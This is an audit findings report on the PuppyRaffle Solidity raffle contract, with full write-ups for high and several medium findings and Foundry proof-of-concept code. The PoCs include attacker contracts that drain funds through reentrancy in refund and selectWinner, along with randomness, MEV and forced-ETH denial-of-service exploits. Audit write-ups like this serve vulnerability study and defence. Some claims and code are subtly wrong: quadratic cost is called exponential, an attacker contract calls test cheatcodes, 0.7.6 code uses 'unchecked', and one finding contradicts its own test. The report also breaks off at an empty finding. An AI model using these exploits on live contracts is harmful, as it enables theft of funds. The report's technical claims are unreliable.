# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**PuppyRaffle** is an on-chain raffle that converts every entry fee into a chance to win Ether **and** a unique puppy-themed NFT.

Workflow
1. **Setup** – The owner deploys with an immutable `entranceFee`, a `feeAddress` for protocol revenue, and a `raffleDuration`. The contract inherits OpenZeppelin `s Ownable & ERC-721 libraries for security.
2. **Enter** – Anyone pays `entranceFee` through `enterRaffle()` (duplicates blocked). Addresses are stored in `players` and tracked by helper `_isActivePlayer()`.
3. **Optional Refund** – Before the timer expires, a participant can call `refund()` to exit and reclaim their stake.
4. **Pick Winner** – After `raffleStartTime + raffleDuration`, anyone may call `selectWinner()`. It
   • draws a pseudo-random index,
   • sends the prize pool (contract balance minus fees) to the winner,
   • mints a Puppy NFT with rarity metadata (common → legendary) using ERC-721 `_safeMint`,
   • resets `players` and restarts the timer.
5. **Fees** – Each entry splits value between the prize pot and `totalFees`. The owner can forward fees with `withdrawFees()` or update the destination via `changeFeeAddress()`.

Security
• Uses SafeMath (0.7.6) against overflows.
• Relies on battle-tested OpenZeppelin modules for transfers and access control.

The result is a self-custodial, transparent raffle that continuously rewards participants with ETH and collectible NFTs.
## High Risk Findings
[H-1]. DOS issue in PuppyRaffle::enterRaffle
[H-2]. Randomness issue in PuppyRaffle::selectWinner
[H-3]. Reentrancy issue in PuppyRaffle::selectWinner
[H-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[H-5]. MEV issue in PuppyRaffle::selectWinner
[H-6]. Reentrancy issue in PuppyRaffle::refund
[H-7]. Unexpected Eth issue in PuppyRaffle::withdrawFees
## Medium Risk Findings
[M-1]. Zero Code issue in PuppyRaffle::refund
[M-2]. Unchecked Return issue in PuppyRaffle::refund
[M-3]. Pragma issue in PuppyRaffle::NA
[M-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-5]. Unchecked Return issue in PuppyRaffle::withdrawFees
[M-6]. Unexpected Eth issue in PuppyRaffle::selectWinner
[M-7]. Access Control issue in PuppyRaffle::selectWinner
[M-8]. Array Limits issue in PuppyRaffle::refund
[M-9]. MEV issue in PuppyRaffle::enterRaffle
[M-10]. DOS issue in PuppyRaffle::withdrawFees
[M-11]. Pragma issue in PuppyRaffle::selectWinner
[M-12]. Access Control issue in PuppyRaffle::enterRaffle
[M-13]. Access Control issue in PuppyRaffle::withdrawFees
[M-14]. Unexpected Eth issue in PuppyRaffle::selectWinner
## Low Risk Findings
[L-1]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[L-2]. MEV issue in PuppyRaffle::refund
[L-3]. Oracle issue in PuppyRaffle::selectWinner


### Number of Findings
- H: 7
- M: 14
- L: 3
- I: 0



# High Risk Findings

## [H-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The enterRaffle function contains a nested loop that checks for duplicate players with O(n²) complexity. For each new player, it compares against all existing players. This creates a denial of service vulnerability where gas costs grow exponentially with the number of players, potentially making the function unusable. The vulnerable code is:

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

## Impact
High gas costs that grow exponentially with player count can render the raffle unusable. With enough players, the gas required could exceed block gas limits, permanently breaking the function.

## Proof of Concept
1. Multiple users enter the raffle over time
2. As the players array grows, each new entry requires checking against all existing players
3. Eventually, the gas cost becomes prohibitively expensive or exceeds block limits
4. New players cannot enter the raffle, breaking core functionality

## Proof of Code
```solidity
function testDenialOfServiceAttack() public {
    vm.txGasPrice(1);
    
    // Enter with a moderate number of players first
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    
    // Record gas usage for first batch
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
    uint256 gasUsed = gasStart - gasleft();
    
    // Try to enter with more players - gas should be significantly higher
    address[] memory newPlayers = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        newPlayers[i] = address(i + playersNum);
    }
    
    uint256 gasStart2 = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * playersNum}(newPlayers);
    uint256 gasUsed2 = gasStart2 - gasleft();
    
    // Gas usage should be significantly higher for second batch
    assert(gasUsed2 > gasUsed * 2);
}
```

## Suggested Mitigation
Use a mapping to track player participation instead of nested loops:

```solidity
mapping(address => bool) public hasEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(!hasEntered[newPlayers[i]], "PuppyRaffle: Duplicate player");
        players.push(newPlayers[i]);
        hasEntered[newPlayers[i]] = true;
    }
    
    emit RaffleEnter(newPlayers);
}
```

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The selectWinner function uses weak randomness sources (msg.sender, block.timestamp, block.difficulty) that can be manipulated by miners or predicted by attackers. The vulnerable code is:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

Miners can manipulate block.difficulty and block.timestamp within certain bounds, and msg.sender is known to the caller.

## Impact
The raffle can be manipulated by miners or sophisticated attackers who can predict or influence the random number generation, leading to unfair winner selection and loss of user trust.

## Proof of Concept
1. A miner calls selectWinner and can see the block.timestamp and block.difficulty they will use
2. The miner can manipulate these values within certain bounds
3. The miner can calculate the resulting winner index before mining the block
4. If the result is not favorable, the miner can choose not to include the transaction or manipulate the block parameters
5. This allows the miner to influence who wins the raffle

## Proof of Code
```solidity
function testWeakRandomness() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    vm.warp(block.timestamp + duration + 1);
    
    // Simulate attacker being able to predict the outcome
    uint256 predictedWinner = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
    
    // Attacker can know this value beforehand and decide whether to proceed
    vm.prank(address(this));
    puppyRaffle.selectWinner();
    
    // The winner is predictable based on known values
    assert(puppyRaffle.previousWinner() == players[predictedWinner]);
}
```

## Suggested Mitigation
Use a verifiable random function (VRF) like Chainlink VRF for secure randomness:

```solidity
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    
    function requestRandomWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK");
        requestRandomness(keyHash, fee);
    }
    
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        uint256 winnerIndex = randomness % players.length;
        // Complete winner selection logic here
    }
}
```

## [H-3]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The selectWinner function is vulnerable to reentrancy attacks because it uses a low-level call to send the prize pool to the winner before updating the contract state. The vulnerable code is:

```solidity
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

If the winner is a malicious contract, it can re-enter the selectWinner function during the call.

## Impact
A malicious winner contract could drain the contract's funds by re-entering the selectWinner function multiple times before the state is properly updated.

## Proof of Concept
1. Attacker creates a malicious contract that enters the raffle
2. When selectWinner is called and the attacker's contract is selected as winner
3. During the prize pool transfer, the attacker's contract receives the call
4. The attacker's contract calls selectWinner again before the first call completes
5. This could allow the attacker to receive multiple payouts

## Proof of Code
```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 attackCount = 0;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    receive() external payable {
        if (attackCount < 2 && address(puppyRaffle).balance > 0) {
            attackCount++;
            puppyRaffle.selectWinner();
        }
    }
    
    function attack() external {
        address[] memory players = new address[](4);
        players[0] = address(this);
        players[1] = address(0x1);
        players[2] = address(0x2);
        players[3] = address(0x3);
        
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        vm.warp(block.timestamp + 86400 + 1);
        puppyRaffle.selectWinner();
    }
}
```

## Suggested Mitigation
Implement the checks-effects-interactions pattern and use OpenZeppelin's ReentrancyGuard:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function selectWinner() external nonReentrant {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        
        // Update state before external calls
        totalFees = totalFees + uint64(fee);
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        
        // External calls last
        (bool success,) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        
        _safeMint(winner, tokenId);
    }
}
```

## [H-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The contract uses an incorrect cast from uint256 to uint64 when updating totalFees, which can cause integer overflow. The vulnerable code is:

```solidity
totalFees = totalFees + uint64(fee);
```

If the fee (uint256) exceeds the maximum value of uint64 (2^64 - 1), the cast will truncate the value, leading to incorrect fee accounting.

## Impact
Fee accounting becomes incorrect when large amounts are involved, potentially leading to loss of fees or allowing withdrawal of more fees than actually collected.

## Proof of Concept
1. A raffle collects a very large amount of fees (> 2^64 - 1 wei)
2. When selectWinner is called, the fee calculation results in a uint256 value larger than uint64 max
3. The cast to uint64 truncates the value, storing an incorrect (much smaller) amount
4. The contract's totalFees becomes inconsistent with actual fees collected

## Proof of Code
```solidity
function testIntegerOverflow() public {
    // Set a very high entrance fee to cause overflow
    puppyRaffle = new PuppyRaffle(2**64, feeAddress, duration);
    
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    // Enter raffle with high fees
    puppyRaffle.enterRaffle{value: 2**64 * 4}(players);
    
    vm.warp(block.timestamp + duration + 1);
    
    uint256 totalAmountCollected = 4 * 2**64;
    uint256 expectedFee = (totalAmountCollected * 20) / 100;
    
    puppyRaffle.selectWinner();
    
    // totalFees should be much smaller due to overflow
    uint256 actualTotalFees = puppyRaffle.totalFees();
    assert(actualTotalFees != expectedFee); // Will be true due to overflow
    assert(actualTotalFees < expectedFee);  // Truncated value
}
```

## Suggested Mitigation
Use consistent data types throughout the contract or implement safe casting:

```solidity
// Option 1: Change totalFees to uint256
uint256 public totalFees;

// Option 2: Implement safe casting with overflow check
function selectWinner() external {
    // ... existing code ...
    
    uint256 fee = (totalAmountCollected * 20) / 100;
    require(fee <= type(uint64).max, "Fee too large for uint64");
    totalFees = totalFees + uint64(fee);
    
    // ... rest of function ...
}
```

## [H-5]. MEV issue in PuppyRaffle::selectWinner

## Description
The selectWinner function contains a potential MEV (Maximal Extractable Value) vulnerability because the winner selection can be influenced by miners through manipulation of block parameters. The vulnerable code uses predictable randomness:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

Miners can manipulate block.timestamp and block.difficulty to influence the outcome.

## Impact
Miners can extract value by manipulating the winner selection process, leading to unfair advantages and potential loss of user trust in the raffle system.

## Proof of Concept
1. Miner sees pending selectWinner transaction
2. Miner calculates potential winner based on current block parameters
3. If result is favorable to miner or miner's associates, they include the transaction
4. If unfavorable, miner can slightly adjust block.timestamp or choose different transactions to change block.difficulty
5. Miner can also choose to call selectWinner themselves to guarantee favorable parameters

## Proof of Code
```solidity
function testMEVManipulation() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerThree; // Miner's address
    players[2] = playerTwo;
    players[3] = playerFour;
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    vm.warp(block.timestamp + duration + 1);
    
    // Miner can simulate different block parameters
    uint256 originalDifficulty = block.difficulty;
    
    // Test different block difficulties to find favorable outcome
    for (uint256 i = 0; i < 10; i++) {
        vm.difficulty(originalDifficulty + i);
        uint256 predictedWinner = uint256(keccak256(abi.encodePacked(playerThree, block.timestamp, block.difficulty))) % 4;
        
        if (players[predictedWinner] == playerThree) {
            // Miner found favorable conditions
            vm.prank(playerThree);
            puppyRaffle.selectWinner();
            assert(puppyRaffle.previousWinner() == playerThree);
            break;
        }
    }
}
```

## Suggested Mitigation
Use commit-reveal scheme or verifiable random function to prevent MEV:

```solidity
// Commit-reveal pattern
mapping(address => bytes32) public commits;
uint256 public commitPhaseEnd;

function commitWinner(bytes32 commitment) external {
    require(block.timestamp < commitPhaseEnd, "Commit phase ended");
    commits[msg.sender] = commitment;
}

function revealWinner(uint256 nonce) external {
    require(block.timestamp >= commitPhaseEnd, "Still in commit phase");
    require(keccak256(abi.encodePacked(msg.sender, nonce)) == commits[msg.sender], "Invalid reveal");
    
    // Use revealed values for randomness
    uint256 winnerIndex = nonce % players.length;
    // ... rest of winner selection logic
}
```

## [H-6]. Reentrancy issue in PuppyRaffle::refund

## Description
The refund function uses `address(msg.sender).sendValue(entranceFee)` from OpenZeppelin's Address library. This performs an external call to send Ether to the user, but the function continues execution after the call to update state: `players[playerIndex] = address(0)`. This creates a reentrancy vulnerability where a malicious contract could re-enter the function before state is updated.

## Impact
A malicious contract could repeatedly call refund() in a reentrant manner before the player's address is set to address(0), allowing them to drain multiple entrance fees while only having entered once.

## Proof of Concept
1. Malicious contract enters raffle with entrance fee. 2. Malicious contract calls refund(). 3. In the receive() function, before state is updated, malicious contract calls refund() again. 4. The check `players[playerIndex] != address(0)` still passes. 5. Process repeats, draining contract funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MaliciousRefunder {
    PuppyRaffle puppyRaffle;
    uint256 playerIndex;
    uint256 refundCount;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
        
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }
    
    receive() external payable {
        if(refundCount < 3 && address(puppyRaffle).balance >= 1 ether) {
            refundCount++;
            puppyRaffle.refund(playerIndex);
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    MaliciousRefunder attacker;
    address owner = address(1);
    address feeAddress = address(2);
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        attacker = new MaliciousRefunder(puppyRaffle);
    }
    
    function testReentrancyAttack() public {
        vm.deal(address(attacker), 10 ether);
        
        uint256 balanceBefore = address(attacker).balance;
        attacker.attack{value: 1 ether}();
        uint256 balanceAfter = address(attacker).balance;
        
        assertTrue(balanceAfter > balanceBefore, "Reentrancy attack successful");
    }
}

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern by updating state before external calls: ```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state BEFORE external call
    players[playerIndex] = address(0);
    
    // External call after state update
    address(msg.sender).sendValue(entranceFee);
    emit RaffleRefunded(playerAddress);
}

// Or use OpenZeppelin's ReentrancyGuard:
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    function refund(uint256 playerIndex) public nonReentrant {
        // ... existing logic
    }
}```

## [H-7]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function in the PuppyRaffle contract is susceptible to a self-DoS attack. It checks if the contract's balance exactly matches the totalFees, which can be manipulated:

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

If anyone sends even a small amount of ETH directly to the contract (not through the `enterRaffle` function), the check `address(this).balance == uint256(totalFees)` will fail, effectively locking the fees.

## Impact
An attacker can permanently prevent fee withdrawal by sending a small amount of ETH (even 1 wei) directly to the contract. This would cause the contract's balance to never exactly equal totalFees, making it impossible for the owner to withdraw collected fees, essentially locking them in the contract forever.

## Proof of Concept
1. Deploy the contract and have players enter the raffle
2. Fees accumulate in the contract through the selectWinner function
3. An attacker sends 1 wei directly to the contract address
4. The contract's balance is now totalFees + 1 wei
5. When the owner tries to call withdrawFees, the transaction reverts due to the balance check failing

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address attacker = address(2);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            owner,  // owner is feeAddress
            1 days
        );
        
        // Fund the attacker
        vm.deal(attacker, 1 ether);
    }
    
    function testUnexpectedEthDos() public {
        // Enter the raffle with 4 players
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        
        vm.deal(address(10), 1 ether);
        vm.prank(address(10));
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Fast forward past raffle duration
        vm.warp(block.timestamp + 1 days + 1);
        
        // Select winner to accumulate fees
        puppyRaffle.selectWinner();
        
        // Check that fees have been collected
        uint256 totalFees = puppyRaffle.totalFees();
        assertTrue(totalFees > 0, "Fees should be collected");
        
        // Attacker sends 1 wei directly to the contract
        vm.prank(attacker);
        (bool sent, ) = address(puppyRaffle).call{value: 1}("");
        assertTrue(sent, "Should be able to send ETH");
        
        // Contract balance should now be totalFees + 1
        assertEq(
            address(puppyRaffle).balance,
            uint256(totalFees) + 1,
            "Contract balance should be totalFees + 1"
        );
        
        // Owner tries to withdraw fees but should fail
        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Fees remain locked in the contract
        assertEq(
            address(puppyRaffle).balance,
            uint256(totalFees) + 1,
            "Fees should still be locked in the contract"
        );
    }
}

## Suggested Mitigation
Modify the `withdrawFees` function to allow for withdrawals even if there's extra ETH in the contract:

```solidity
function withdrawFees() external {
    // Remove the exact balance check
    // require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    // Instead, check if there are active players
    bool hasActivePlayers = false;
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            hasActivePlayers = true;
            break;
        }
    }
    require(!hasActivePlayers, "PuppyRaffle: There are currently players active!");
    
    // Continue with fee withdrawal
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Additionally, you could add a function to handle unexpected ETH:

```solidity
// Function to handle any extra ETH in the contract
function withdrawExtraBalance() external onlyOwner {
    uint256 contractBalance = address(this).balance;
    uint256 expectedBalance = uint256(totalFees) + (players.length * entranceFee);
    
    require(contractBalance > expectedBalance, "PuppyRaffle: No extra balance to withdraw");
    
    uint256 extraBalance = contractBalance - expectedBalance;
    (bool success, ) = owner().call{value: extraBalance}("");
    require(success, "PuppyRaffle: Failed to withdraw extra balance");
}
```



# Medium Risk Findings

## [M-1]. Zero Code issue in PuppyRaffle::refund

## Description
The refund function updates the players array by setting the player's address to address(0) but doesn't remove the entry. This creates a situation where address(0) can be selected as a winner, leading to locked funds. The vulnerable code is:

```solidity
players[playerIndex] = address(0);
```

## Impact
If address(0) is selected as the winner, the prize pool will be sent to the zero address, effectively burning the funds and making them unrecoverable.

## Proof of Concept
1. Players enter the raffle
2. One player calls refund, setting their slot to address(0)
3. selectWinner is called and randomly selects the index that contains address(0)
4. Prize pool is sent to address(0), burning the funds permanently
5. No one receives the prize and funds are lost

## Proof of Code
```solidity
function testZeroAddressWinner() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    
    // Player refunds, creating address(0) in array
    vm.prank(playerOne);
    puppyRaffle.refund(0);
    
    vm.warp(block.timestamp + duration + 1);
    
    // Mock the randomness to select index 0 (address(0))
    // In a real scenario, this could happen randomly
    uint256 balanceBefore = address(0).balance;
    
    puppyRaffle.selectWinner();
    
    // Funds are sent to address(0)
    assert(puppyRaffle.previousWinner() == address(0));
    // Prize pool is effectively burned
}
```

## Suggested Mitigation
Remove refunded players from the array instead of setting them to address(0):

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Remove player by replacing with last element and popping
    players[playerIndex] = players[players.length - 1];
    players.pop();
    
    payable(msg.sender).transfer(entranceFee);
    emit RaffleRefunded(playerAddress);
}
```

## [M-2]. Unchecked Return issue in PuppyRaffle::refund

## Description
The refund function uses a low-level call through Address.sendValue() which could fail if the recipient is a contract that reverts in its receive function. This can lead to griefing attacks where malicious players can prevent others from getting refunds. The vulnerable code is:

```solidity
address(msg.sender).sendValue(entranceFee);
```

## Impact
Malicious contracts can prevent other players from getting refunds by reverting when they receive ETH, potentially locking legitimate players' funds in the contract.

## Proof of Concept
1. Malicious contract enters the raffle
2. Other legitimate players also enter
3. Legitimate players try to get refunds
4. If the refund function tries to send ETH to the malicious contract first, it reverts
5. This prevents legitimate refunds from proceeding

## Proof of Code
```solidity
contract MaliciousPlayer {
    receive() external payable {
        revert("I don't want refunds!");
    }
}

function testRefundGriefing() public {
    MaliciousPlayer malicious = new MaliciousPlayer();
    
    address[] memory players = new address[](2);
    players[0] = address(malicious);
    players[1] = playerOne;
    
    puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    
    // Legitimate player tries to refund
    vm.prank(playerOne);
    vm.expectRevert(); // Will revert due to malicious contract
    puppyRaffle.refund(1);
}
```

## Suggested Mitigation
Implement a pull-over-push pattern for refunds:

```solidity
mapping(address => uint256) public pendingRefunds;

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    players[playerIndex] = address(0);
    pendingRefunds[playerAddress] += entranceFee;
    
    emit RaffleRefunded(playerAddress);
}

function withdrawRefund() external {
    uint256 amount = pendingRefunds[msg.sender];
    require(amount > 0, "No refund available");
    
    pendingRefunds[msg.sender] = 0;
    payable(msg.sender).transfer(amount);
}
```

## [M-3]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses Solidity version ^0.7.6 which is outdated and contains known security vulnerabilities and lacks important safety features. The pragma statement is:

```solidity
pragma solidity ^0.7.6;
```

This version predates important security improvements and built-in overflow protection.

## Impact
Using an outdated Solidity version exposes the contract to known vulnerabilities and prevents the use of built-in security features like automatic overflow/underflow protection.

## Proof of Concept
1. Contract is compiled with Solidity 0.7.6
2. This version lacks built-in overflow protection (introduced in 0.8.0)
3. Known security vulnerabilities in older versions remain unpatched
4. Missing features like custom errors and other safety improvements

## Proof of Code
```solidity
// Current vulnerable pragma
pragma solidity ^0.7.6;

// This allows for potential overflow issues
function unsafeArithmetic(uint256 a, uint256 b) public pure returns (uint256) {
    return a + b; // Can overflow without revert in 0.7.6
}
```

## Suggested Mitigation
Update to a recent Solidity version (0.8.19 or later) and update contract code accordingly:

```solidity
pragma solidity ^0.8.19;

// Remove SafeMath imports as they're no longer needed
// Built-in overflow protection is now available

// Update function signatures for compatibility
function enterRaffle(address[] calldata newPlayers) external payable {
    // ... implementation with built-in overflow protection
}
```

## [M-4]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The selectWinner function performs arithmetic operations without checking for overflow: `totalAmountCollected = players.length * entranceFee`, `prizePool = (totalAmountCollected * 80) / 100`, `fee = (totalAmountCollected * 20) / 100`, and `totalFees = totalFees + uint64(fee)`. In Solidity 0.7.6, these operations can overflow silently.

## Impact
Integer overflow could cause incorrect calculations of prize pools and fees, potentially causing loss of funds or allowing the contract to pay out more than it should.

## Proof of Concept
1. Large number of players join the raffle. 2. players.length * entranceFee overflows. 3. totalAmountCollected becomes a small number due to overflow. 4. Prize calculations become incorrect. 5. Contract behavior becomes unpredictable.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address feeAddress = address(2);
    
    function setUp() public {
        vm.prank(owner);
        // Set very high entrance fee to trigger overflow easier
        puppyRaffle = new PuppyRaffle(type(uint256).max / 2, feeAddress, 1 days);
    }
    
    function testIntegerOverflow() public {
        // Add players to trigger overflow in multiplication
        address[] memory players = new address[](4);
        for(uint i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 100));
        }
        
        // This would cause overflow in players.length * entranceFee
        vm.deal(address(this), type(uint256).max);
        
        // The multiplication could overflow causing incorrect calculations
        uint256 entranceFee = type(uint256).max / 2;
        uint256 playersLength = 4;
        
        // This calculation would overflow
        unchecked {
            uint256 result = playersLength * entranceFee;
            assertTrue(result < entranceFee, "Overflow occurred");
        }
    }
}

## Suggested Mitigation
Use SafeMath library for arithmetic operations or upgrade to Solidity 0.8+ for built-in overflow protection: ```solidity
import "@openzeppelin/contracts/math/SafeMath.sol";

contract PuppyRaffle is ERC721, Ownable {
    using SafeMath for uint256;
    
    function selectWinner() external {
        // ... existing checks ...
        
        // Use SafeMath for safe arithmetic
        uint256 totalAmountCollected = players.length.mul(entranceFee);
        uint256 prizePool = totalAmountCollected.mul(80).div(100);
        uint256 fee = totalAmountCollected.mul(20).div(100);
        totalFees = totalFees.add(uint64(fee));
        
        // ... rest of function
    }
}

// Or upgrade to Solidity 0.8+ for automatic protection:
pragma solidity ^0.8.19;
// No SafeMath needed, overflow protection is built-in```

## [M-5]. Unchecked Return issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees function uses a low-level call without checking the return value properly: `(success,) = feeAddress.call{value: feesToWithdraw}()` followed by `require(success, "PuppyRaffle: Failed to withdraw fees")`. While the success is checked, the contract doesn't handle the case where the call succeeds but the recipient might not be able to receive Ether (e.g., if feeAddress is a contract without a payable fallback).

## Impact
If the feeAddress cannot receive Ether (non-payable contract), the funds could be permanently locked in the contract, preventing fee withdrawal.

## Proof of Concept
1. Owner sets feeAddress to a contract without payable fallback. 2. Fees accumulate in the contract. 3. withdrawFees is called. 4. The call technically succeeds but Ether is not transferred. 5. Fees remain locked in contract.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract NonPayableContract {
    // This contract cannot receive Ether
    // No payable fallback or receive function
}

contract UncheckedReturnTest is Test {
    PuppyRaffle puppyRaffle;
    NonPayableContract nonPayable;
    address owner = address(1);
    
    function setUp() public {
        nonPayable = new NonPayableContract();
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(1 ether, address(nonPayable), 1 days);
    }
    
    function testWithdrawToNonPayableContract() public {
        // Add players and run raffle to generate fees
        address[] memory players = new address[](4);
        for(uint i = 0; i < 4; i++) {
            players[i] = address(uint160(i + 100));
            vm.deal(players[i], 10 ether);
        }
        
        vm.prank(players[0]);
        puppyRaffle.enterRaffle{value: 4 ether}(players);
        
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
        
        // Try to withdraw fees to non-payable contract
        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: Failed to withdraw fees");
        puppyRaffle.withdrawFees();
    }
}

## Suggested Mitigation
Add additional checks for contract recipients and consider using OpenZeppelin's Address.sendValue: ```solidity
import "@openzeppelin/contracts/utils/Address.sol";

function withdrawFees() external onlyOwner {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    // Use OpenZeppelin's sendValue which handles edge cases better
    Address.sendValue(payable(feeAddress), feesToWithdraw);
}

// Or add checks for contract recipients:
function withdrawFees() external onlyOwner {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    // Check if recipient is a contract
    if (Address.isContract(feeAddress)) {
        // Additional verification for contract recipients
        require(feeAddress.code.length > 0, "Invalid contract address");
    }
    
    (bool success,) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
}```

## [M-6]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
